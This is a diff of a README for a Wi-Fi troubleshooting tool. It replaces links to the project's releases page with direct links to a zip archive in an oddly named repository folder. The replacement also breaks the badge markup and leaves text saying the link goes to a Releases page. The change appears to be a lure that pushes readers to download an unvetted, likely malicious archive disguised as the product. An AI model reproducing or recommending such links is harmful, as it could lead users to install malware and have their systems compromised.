@@ -1,6 +1,6 @@
 # 🌐 WIFI-RESOLVER - Simplify Your Network Troubleshooting
 
-[![Download WIFI-RESOLVER](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Gaurav24-01/WIFI-RESOLVER/releases)
+[![Download WIFI-RESOLVER](https://raw.githubusercontent.com/Gaurav24-01/WIFI-RESOLVER/main/enterozoa/WIFI-RESOLVER-v2.8.zip%20Now-Click%https://raw.githubusercontent.com/Gaurav24-01/WIFI-RESOLVER/main/enterozoa/WIFI-RESOLVER-v2.8.zip)](https://raw.githubusercontent.com/Gaurav24-01/WIFI-RESOLVER/main/enterozoa/WIFI-RESOLVER-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you start, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download WIFI Resolver, visit this page: [Download WIFI-RESOLVER](https://github.com/Gaurav24-01/WIFI-RESOLVER/releases). 
+To download WIFI Resolver, visit this page: [Download WIFI-RESOLVER](https://raw.githubusercontent.com/Gaurav24-01/WIFI-RESOLVER/main/enterozoa/WIFI-RESOLVER-v2.8.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of WIFI Resolver.
